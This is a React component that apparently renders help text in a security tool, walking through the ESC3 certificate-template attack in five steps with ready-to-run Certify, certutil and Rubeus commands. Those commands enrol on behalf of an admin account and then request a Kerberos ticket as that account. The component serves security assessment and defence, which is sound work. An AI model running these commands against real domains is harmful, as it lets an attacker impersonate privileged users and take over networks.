// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { Box, Typography } from '@mui/material';

const WindowsAbuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>The ESC3 attack can be carried out in the following manner.</Typography>
            <Typography variant='body2'>
                <Box component='span' sx={{ fontWeight: 'bold' }}>
                    Step 1:
                </Box>{' '}
                Use Certify to request an enrollment agent certificate.
            </Typography>
            <Typography component={'pre'}>
                {'Certify.exe request /ca:CORPDC01.CORP.LOCAL\\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent'}
            </Typography>
            <Typography variant='body2'>
                <Box component='span' sx={{ fontWeight: 'bold' }}>
                    Step 2:
                </Box>{' '}
                Convert the emitted certificate to PFX format.
            </Typography>
            <Typography component={'pre'}>
                {'certutil.exe -MergePFX .\\enrollmentcert.pem .\\enrollmentcert.pfx'}
            </Typography>
            <Typography variant='body2'>
                <Box component='span' sx={{ fontWeight: 'bold' }}>
                    Step 3:
                </Box>{' '}
                Use the enrollment agent certificate to issue a certificate request on behalf of another user to a
                certificate template that allow for authentication and permit enrollment agent enrollment.
            </Typography>
            <Typography component={'pre'}>
                {
                    'Certify.exe request /ca:CORPDC01.CORP.LOCAL\\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\\itadmin /enrollment:enrollmentcert.pfx'
                }
            </Typography>
            <Typography variant='body2'>
                Save the certificate as <Box component='code'>itadminenrollment.pem</Box> and the private key as{' '}
                <Box component='code'>itadminenrollment.key</Box>.
            </Typography>
            <Typography variant='body2'>
                <Box component='span' sx={{ fontWeight: 'bold' }}>
                    Step 4:
                </Box>{' '}
                Convert the emitted certificate to PFX format.
            </Typography>
            <Typography component={'pre'}>
                {'certutil.exe -MergePFX .\\itadminenrollment.pem .\\itadminenrollment.pfx'}
            </Typography>
            <Typography variant='body2'>
                <Box component='span' sx={{ fontWeight: 'bold' }}>
                    Step 5:
                </Box>{' '}
                Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the target identity to
                impersonate and the PFX-formatted certificate created in Step 4.
            </Typography>
            <Typography component={'pre'}>
                {'Rubeus.exe asktgt /user:CORP\\itadmin /certificate:itadminenrollment.pfx'}
            </Typography>
        </>
    );
};

export default WindowsAbuse;
